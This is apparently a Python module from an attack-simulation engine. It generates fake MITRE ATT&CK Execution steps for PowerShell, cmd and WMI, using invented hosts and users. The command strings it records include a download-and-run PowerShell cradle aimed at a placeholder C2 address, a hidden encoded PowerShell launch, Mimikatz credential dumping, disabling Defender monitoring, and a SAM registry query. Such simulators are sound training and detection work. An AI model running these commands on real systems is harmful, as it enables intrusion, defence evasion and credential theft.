"""
core/attack_engine/techniques/execution.py
───────────────────────────────────────────
MITRE ATT&CK Execution techniques.
  - T1059.001  PowerShell
  - T1059.003  Windows Command Shell
  - T1059.006  Python
  - T1047      Windows Management Instrumentation
"""

from __future__ import annotations
import random
from typing import Any
from config.constants import KillChainPhase, Severity
from core.attack_engine.techniques.base import BaseTechnique, AttackStep


class PowerShellExecution(BaseTechnique):
    TECHNIQUE_ID   = "T1059.001"
    TECHNIQUE_NAME = "Command and Scripting Interpreter: PowerShell"
    TACTIC         = "execution"
    PHASE          = KillChainPhase.EXPLOITATION
    BASE_SEVERITY  = Severity.HIGH

    COMMANDS = [
        "IEX (New-Object Net.WebClient).DownloadString('http://{c2}/payload.ps1')",
        "powershell -enc {b64} -NoP -NonI -W Hidden",
        "Invoke-Mimikatz -DumpCreds",
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Get-ADUser -Filter * | Select SamAccountName",
    ]

    def execute(self, context: dict[str, Any]) -> AttackStep:
        host    = context.get("initial_access_host", self._fake_hostname())
        user    = context.get("initial_access_user", self._fake_username())
        c2_ip   = self._fake_ip(internal=False)
        cmd     = random.choice(self.COMMANDS).format(c2=c2_ip, b64="AABBCCDD==")
        success = self._did_succeed()

        # Expert attackers obfuscate PowerShell
        if self.difficulty == "expert":
            cmd = f"powershell -enc {cmd[:10]}[OBFUSCATED]"

        context.setdefault("executed_commands", []).append(cmd)

        return self._make_step(
            description=f"PowerShell executed on {host} as {user}: {cmd[:60]}...",
            source_host=host, target_host=host, success=success,
            extra_data={
                "command": cmd, "user": user, "host": host,
                "obfuscated": self.difficulty == "expert",
                "execution_policy_bypass": True,
                "amsi_bypass": self.difficulty in ("hard", "expert"),
            },
        )


class CMDExecution(BaseTechnique):
    TECHNIQUE_ID   = "T1059.003"
    TECHNIQUE_NAME = "Command and Scripting Interpreter: Windows Command Shell"
    TACTIC         = "execution"
    PHASE          = KillChainPhase.EXPLOITATION
    BASE_SEVERITY  = Severity.MEDIUM

    def execute(self, context: dict[str, Any]) -> AttackStep:
        host    = context.get("initial_access_host", self._fake_hostname())
        user    = context.get("initial_access_user", self._fake_username())
        cmds    = ["net user /domain", "whoami /priv", "ipconfig /all",
                   "tasklist /v", "reg query HKLM\\SAM", "certutil -urlcache -f"]
        cmd     = random.choice(cmds)
        success = self._did_succeed()
        return self._make_step(
            description=f"CMD shell command on {host}: `{cmd}`",
            source_host=host, target_host=host, success=success,
            extra_data={"command": cmd, "user": user, "shell": "cmd.exe"},
        )


class WMIExecution(BaseTechnique):
    TECHNIQUE_ID   = "T1047"
    TECHNIQUE_NAME = "Windows Management Instrumentation"
    TACTIC         = "execution"
    PHASE          = KillChainPhase.EXPLOITATION
    BASE_SEVERITY  = Severity.HIGH

    def execute(self, context: dict[str, Any]) -> AttackStep:
        src_host = context.get("initial_access_host", self._fake_hostname())
        tgt_host = self._fake_hostname("SRV")
        user     = context.get("initial_access_user", self._fake_username())
        success  = self._did_succeed()
        return self._make_step(
            description=f"WMI remote execution: {src_host} → {tgt_host} as {user}",
            source_host=src_host, target_host=tgt_host, success=success,
            extra_data={
                "namespace": "root\\cimv2", "method": "Win32_Process.Create",
                "command": "cmd.exe /c whoami > C:\\Temp\\out.txt",
                "user": user,
            },
        )
